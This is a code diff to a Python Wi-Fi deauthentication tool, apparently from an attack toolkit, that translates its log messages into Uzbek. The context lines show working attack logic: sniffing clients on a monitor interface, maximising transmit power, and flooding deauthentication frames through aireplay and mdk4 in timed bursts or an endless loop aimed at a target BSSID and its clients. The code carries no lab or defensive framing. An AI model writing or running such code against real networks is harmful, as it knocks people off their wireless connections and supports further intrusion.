@@ -100,14 +100,14 @@ class ClientTracker:
 
     def start_sniff(self, mon_iface: str, log=print) -> None:
         if not HAS_SCAPY:
-            log("[!] scapy yo'q — client sniff o'chiq (faqat aireplay/mdk4)")
+            log("[!] scapy yo'q — mijoz kuzatuvi o'chiq (faqat aireplay/mdk4)")
             return
         if self._thread and self._thread.is_alive():
             return
         self._stop.clear()
 
         def loop():
-            log(f"[+] Client tracker START @ {mon_iface} (BSSID {self.bssid})")
+            log(f"[+] Mijoz kuzatuvi boshlandi @ {mon_iface} (BSSID {self.bssid})")
             while not self._stop.is_set():
                 try:
                     sniff(
@@ -119,7 +119,7 @@ class ClientTracker:
                 except Exception:
                     if self._stop.wait(1):
                         break
-            log("[*] Client tracker STOP")
+            log("[*] Mijoz kuzatuvi to'xtadi")
 
         self._thread = threading.Thread(target=loop, daemon=True)
         self._thread.start()
@@ -263,21 +263,20 @@ class DeauthStack:
     def burst(self, seconds: int = 12) -> None:
         """Bir martalik kuchli to'lqin."""
         if not wu.iface_exists(self.mon):
-            self.log(f"[-] mon yo'q: {self.mon}")
+            self.log(f"[-] Monitor interfeys yo'q: {self.mon}")
             return
         wu.set_channel(self.mon, self.channel, force_raw=True)
         wu.set_txpower_max(self.mon, log=self.log)
         self.tracker.start_sniff(self.mon, log=self.log)
 
         self.log(
-            f"[*] DEAUTH BURST {seconds}s | BSSID={self.bssid} | "
-            f"aireplay={'✓' if self.has_aireplay else '✗'} "
-            f"mdk4={'✓' if self.has_mdk4 else '✗'}"
+            f"[*] Uzish to'lqini {seconds}s | BSSID={self.bssid} | "
+            f"aireplay={'bor' if self.has_aireplay else 'yoq'} "
+            f"mdk4={'bor' if self.has_mdk4 else 'yoq'}"
         )
         end = time.time() + seconds
         while time.time() < end:
             self.stats["rounds"] += 1
-            # kam paket — tez o'tsin (osilib qolmasin)
             self._aireplay_broadcast(5)
             clients = self.tracker.list()
             for mac in clients[:4]:
@@ -291,8 +290,8 @@ class DeauthStack:
             time.sleep(0.15)
 
         self.log(
-            f"[+] Burst tugadi | clients={self.tracker.count()} | "
-            f"bc={self.stats['broadcast']} dir={self.stats['directed']}"
+            f"[+] To'lqin tugadi | mijozlar={self.tracker.count()} | "
+            f"efir={self.stats['broadcast']} yo'naltirilgan={self.stats['directed']}"
         )
 
     def start_continuous(self) -> None:
@@ -300,7 +299,7 @@ class DeauthStack:
         if self._thread and self._thread.is_alive():
             return
         if not wu.iface_exists(self.mon):
-            self.log(f"[-] mon yo'q: {self.mon}")
+            self.log(f"[-] Monitor interfeys yo'q: {self.mon}")
             return
 
         wu.set_channel(self.mon, self.channel, force_raw=True)
@@ -310,8 +309,8 @@ class DeauthStack:
 
         def loop():
             self.log(
-                f"[+] DEAUTH STACK START @ {self.mon} → {self.bssid} | "
-                f"mdk4={'on' if self.has_mdk4 else 'off'}"
+                f"[+] Uzish boshlandi @ {self.mon} → {self.bssid} | "
+                f"mdk4={'yoqilgan' if self.has_mdk4 else 'o‘chiq'}"
             )
             while not self._stop.is_set():
                 self.stats["rounds"] += 1
@@ -327,13 +326,13 @@ class DeauthStack:
                     self._mdk4_burst(2.0)
                 if self.stats["rounds"] % 8 == 0:
                     self.log(
-                        f"[deauth] round={self.stats['rounds']} "
-                        f"clients={self.tracker.count()} "
-                        f"bc={self.stats['broadcast']} "
-                        f"dir={self.stats['directed']}"
+                        f"[uzish] raund={self.stats['rounds']} "
+                        f"mijozlar={self.tracker.count()} "
+                        f"efir={self.stats['broadcast']} "
+                        f"yo'naltirilgan={self.stats['directed']}"
                     )
                 self._stop.wait(0.8)
-            self.log("[*] DEAUTH STACK STOP")
+            self.log("[*] Uzish to'xtatildi")
 
         self._thread = threading.Thread(target=loop, daemon=True)
         self._thread.start()
@@ -387,11 +386,8 @@ def run_infinite_deauth(
     if extra_clients:
         stack.seed_clients(extra_clients)
 
-    log(
-        f"[*] Kuchli deauth stack | mon={mon} ch={ch} | "
-        f"BSSID={bssid}"
-    )
-    log("    [aireplay broadcast] + [aireplay -c CLIENT] + [mdk4] + [scapy sniff]")
+    log(f"[*] Kuchli uzish | mon={mon} kanal={ch} | BSSID={bssid}")
+    log("    vositalar: aireplay (efir) + aireplay (mijoz) + mdk4 + scapy")
     log("    To'xtatish: Ctrl+C")
 
     try:
